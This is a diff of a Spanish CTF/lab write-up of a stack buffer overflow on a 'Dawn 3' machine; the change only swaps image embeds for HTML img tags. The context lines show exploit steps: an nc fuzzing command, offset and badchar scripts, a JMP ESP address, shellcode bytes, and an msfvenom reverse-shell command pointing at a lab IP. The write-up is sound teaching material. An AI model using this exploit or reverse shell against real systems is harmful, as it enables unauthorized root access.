@@ -79,7 +79,7 @@ python2.7 -c "print 'A'*888" | nc 192.168.1.88 6812
 
 Efectivamente, al enviar 888 'A's el EIP se sobreescribe con '\x41\x41\x41\x41', por lo que se confirma la existencia de un buffer overflow.
 
-![[Pasted image 20210723180349.png]]
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-25-Dawn-3-Vanilla-Buffer-Overflow/Pasted%20image%2020210723180349.png" height="500" width="825" /></p>
 
 ### Getting the offset
 Se procede a generar y a enviar un patrón de `msf-pattern_create` con una longitud de 888 caracteres. Una vez enviado se calcula el offset con el valor que se sobreescribe en el EIP y se concluye con un valor de 524, el valor exacto antes de empezar a sobreescribir el EIP.
@@ -125,7 +125,7 @@ badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x1
 buffer = "A"*524  + "B" * 4 + badchars + "C" * (888 - 524 - 4 - len(badchars))
 ```
 
-![[Pasted image 20210723181811.png]]
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-25-Dawn-3-Vanilla-Buffer-Overflow/Pasted%20image%2020210723181811.png" height="500" width="825" /></p>
 
 Al enviarlo se observa que después de las 'B's se modifican los valores de los badchars que se han enviado, por lo que se confirma que '\x00' es un badchar. Se edita el script y se elimina del array de badchars el '\x00'. Después de esto se vuelve a enviar el payload.
 
@@ -152,7 +152,7 @@ buffer = "A"*524  + "B" * 4 + badchars + "C" * (888 - 524 - 4 - len(badchars))
 
 Esta vez dando como resultado que todos los posibles badchars son admitidos por la aplicación.
 
-![[Pasted image 20210723181956.png]]
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-25-Dawn-3-Vanilla-Buffer-Overflow/Pasted%20image%2020210723181956.png" height="500" width="825" /></p>
 
 ### JMP ESP
 Una vez visto que no existen más badchars se procede a extraer la dirección de memoria que contiene el registro JMP ESP (\xff\xe4), esta instrucción saltará a la parte superior del Stack, cambiando la ubicación de EIP a la parte superior del puntero ESP y ejecutando todo lo que se envíe después de eso. 
@@ -175,7 +175,7 @@ Ya con la dirección de memoria que interesa (0x52501513), se procede a intentar
 buffer = "A"*524  + "\x13\x15\x50\x52"+ "C" * (888 - 524 - 4 - len(badchars))
 ```
 
-![[Pasted image 20210723182901.png]]
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-25-Dawn-3-Vanilla-Buffer-Overflow/Pasted%20image%2020210723182901.png" height="500" width="825" /></p>
 
 Efectivamente, podemos lograr modificar el flujo del programa y enviarlo a la dirección donde están inyectadas las 'C's, toca generar y añadir la shellcode, esta estará situada una vez el EIP se sobreescriba con la dirección de la instrucción JMP ESP.
 
@@ -196,7 +196,7 @@ shell = ("\x8d\xd4\xa1\x40\xe4\xd1\xee\xc6\x14\xab\x7f\xa3\x1a\x18\x7f"
 buffer = "A"*524  + "\x13\x15\x50\x52" + shell +"C" * (888 - 524 - 4 - len(shell))
 ```
 
-![[Pasted image 20210723184455.png]]
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-25-Dawn-3-Vanilla-Buffer-Overflow/Pasted%20image%2020210723184455.png" height="500" width="825" /></p>
 
 Al enviar el payload se observa que no salta a la dirección que debería, para solucionar esto se añadirán unos NoPs (\x90) de esta manera se conseguirá que salte a la siguiente instrucción.
 
@@ -204,7 +204,7 @@ Al enviar el payload se observa que no salta a la dirección que debería, para 
 buffer = "A"*524  + "\x13\x15\x50\x52" + "\x90"*10 + shell + "C" * (888 - 524 - 4 - len(shell))
 ```
 
-![[Pasted image 20210723184641.png]]
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-25-Dawn-3-Vanilla-Buffer-Overflow/Pasted%20image%2020210723184641.png" height="500" width="825" /></p>
 
 El exploit final quedaría:
 
@@ -232,6 +232,6 @@ Como la máquina final que se debe explotar es un Linux, se deberá generar una 
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.212 LPORT=9001 -f c -b '\x00' EXITFUNC=thread
 ```
 
-![[Pasted image 20210723190255.png]]
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-25-Dawn-3-Vanilla-Buffer-Overflow/Pasted%20image%2020210723190255.png" height="500" width="825" /></p>
 
 Como el servicio ya está siendo ejecutado como root se obtendrá acceso total a la máquina.
